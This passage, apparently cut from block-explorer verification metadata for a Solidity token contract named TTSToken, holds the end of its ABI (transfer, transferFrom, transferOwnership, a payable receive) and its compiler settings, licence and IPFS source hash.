name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "TTSToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b922c5f5cc0ee4f7a05cb7c3cb845dbcdf4714e7fdbd47372edd857c219db31d"}